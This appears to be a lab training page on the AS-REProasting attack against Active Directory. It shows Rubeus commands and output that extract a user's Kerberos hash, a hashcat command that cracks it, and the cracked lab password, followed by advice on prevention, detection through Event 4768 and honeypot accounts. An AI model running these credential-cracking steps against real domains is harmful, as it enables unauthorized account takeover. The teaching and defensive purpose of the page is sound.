# AS-REProasting

---

## Description

The `AS-REProasting` attack is similar to the `Kerberoasting` attack; we can obtain crackable hashes for user accounts that have the property `Do not require Kerberos preauthentication` enabled. The success of this attack depends on the strength of the user account password that we will crack.

---

## Attack

To obtain crackable hashes, we can use `Rubeus` again. However, this time, we will use the `asreproast` action. If we don't specify a name, `Rubeus` will extract hashes for each user that has `Kerberos preauthentication` not required:

```powershell
`PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt     ______        _   (_____ \      | |    _____) )_   _| |__  _____ _   _  ___   |  __  /| | | |  _ \| ___ | | | |/___)   | |  \ \| |_| | |_) ) ____| |_| |___ |   |_|   |_|____/|____/|_____)____/(___/    v2.0.1   [*] Action: AS-REP roasting  [*] Target Domain          : eagle.local  [*] Searching path 'LDAP://DC2.eagle.local/DC=eagle,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' [*] SamAccountName         : anni [*] DistinguishedName      : CN=anni,OU=EagleUsers,DC=eagle,DC=local [*] Using domain controller: DC2.eagle.local (172.16.18.4) [*] Building AS-REQ (w/o preauth) for: 'eagle.local\anni' [+] AS-REQ w/o preauth successful! [*] Hash written to C:\Users\bob\Downloads\asrep.txt  [*] Roasted hashes written to : C:\Users\bob\Downloads\asrep.txt`
```

Once `Rubeus` obtains the hash for the user Anni (the only one in the playground environment with preauthentication not required), we will move the output text file to a linux attacking machine.

For `hashcat` to be able to recognize the hash, we need to edit it by adding `23$` after `$krb5asrep$`:

```shellsession
`$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550`
```

We can now use `hashcat` with the hash-mode (option -m) `18200` for `AS-REPRoastable` hashes. We also pass a dictionary file with passwords (the file `passwords.txt`) and save the output of any successfully cracked tickets to the file `asrepcracked.txt`:

```shellsession
`villegasjb@htb[/htb]$ sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force  hashcat (v6.2.5) starting  <SNIP>  Dictionary cache hit: * Filename..: passwords.txt * Passwords.: 10002 * Bytes.....: 76525 * Keyspace..: 10002 * Runtime...: 0 secs  Approaching final keyspace - workload adjusted.

Once `hashcat` cracks the password, we can print the contents of the output file to obtain the cleartext password `Slavi123`:

```shellsession
`villegasjb@htb[/htb]$ sudo cat asrepcrack.txt  $krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c64803358a43d05383e9e01374e8f2b2c92f9d6c669cdc4a1b9c1ed684c7857c965b8e44a285bc0e2f1bc248159aa7448494de4c1f997382518278e375a7a4960153e13dae1cd28d05b7f2377a038062f8e751c1621828b100417f50ce617278747d9af35581e38c381bb0a3ff246912def5dd2d53f875f0a64c46349fdf3d7ed0d8ff5a08f2b78d83a97865a3ea2f873be57f13b4016331eef74e827a17846cb49ccf982e31460ab25c017fd44d46cd8f545db00b6578150a4c59150fbec18f0a2472b18c5123c34e661cc8b52dfee9c93dd86e0afa66524994b04c5456c1e71ccbd2183ba0c43d2550:Slavi123`
```

## Prevention

As mentioned before, the success of this attack depends on the strength of the password of users with `Do not require Kerberos preauthentication` configured.

First and foremost, we should only use this property if needed; a good practice is to review accounts quarterly to ensure that we have not assigned this property. Because this property is often found with some regular user accounts, they tend to have easier-to-crack passwords than service accounts with SPNs (those from Kerberoast). Therefore, for users requiring this configured, we should assign a separate password policy, which requires at least 20 characters to thwart cracking attempts.

---

## Detection

When we executed Rubeus, an Event with ID `4768` was generated, signaling that a `Kerberos Authentication ticket` was generated:

![Security log Event 4768: Kerberos authentication ticket requested by user 'anni' from IP 172.16.18.25.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A2/AsrepDetect.png)

The caveat is that AD generates this event for every user that authenticates with Kerberos to any device; therefore, the presence of this event is very abundant. However, it is possible to know where the user authenticated from, which we can then use to correlate known good logins against potential malicious hash extractions. It may be hard to inspect specific IP addresses, especially if a user moves around office locations. However, it is possible to scrutinize the particular VLAN and alert on anything outside it.

Another field we should focus on is the [Pre-Authentication Type](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768#table-5-kerberos-pre-authentication-types), which holds information related to the type of request. Tools that take advantage of the "`Do not require Kerberos preauthentication`" option on a domain user account generate the `0` type in the event related to logon without Pre-Authentication. Commonly, these tools will target weak encryption types such as `RC4` ([0x17](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768#kerberos-encryption-types) within the `Ticket Encryption Type` field of the event. `Rubeus` defaults to using the RC4 encryption type, as we can see in the [source code](https://github.com/GhostPack/Rubeus/blob/e35a5e3a2ce016e251bf32aa9a923cc17870318c/Rubeus/lib/Roast.cs#L116).

## Honeypot

For this attack, a `honeypot user` is an excellent detection option to configure in AD environments; this must be a user with no real use/need in the environment, such that no login attempts are performed regularly. Therefore, any attempt(s) to perform a login for this account is likely malicious and requires inspection.

However, suppose the honeypot user is the only account with `Kerberos Pre-Authentication not required`. In that case, there might be better detection methods, as it would be very obvious for advanced threat actors that it is a honeypot user, resulting in them avoiding interactions with it. (I did previously hear from an organization that needed one of these accounts (application related) that the 'security through obscurity' behind having only one of these accounts may save them, as attackers will avoid going after it thinking it is a honeypot user. While it may be true in some instances, we should not let a glimpse of hope dictate the security state of the environment.)

To make a good honeypot user, we should ensure the following:

- The account must be a relatively old user, ideally one that has become bogus (advanced threat actors will not request tickets for new accounts because they likely have strong passwords and the possibility of being a honeypot user).
- For a service account user, the password should ideally be over two years old. For regular users, maintain the password so it does not become older than one year.
- The account must have logins after the day the password was changed; otherwise, it becomes self-evident if the last password change day is the same as the previous login.
- The account must have some privileges assigned to it; otherwise, it won't be interesting to try to crack its password's hash.

If we go back to our playground environment and configure the user 'svc-iam' (presumably an old IAM account leftover) with the recommendations above, then any request to obtain a TGT for that account should be alerted on. The event received would look like this:

![Security log Event 4768: Kerberos ticket requested by 'svc-iam', IP 172.16.18.25. Alert: Honeypot triggered, suspicious device.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A2/honeypot2.png)
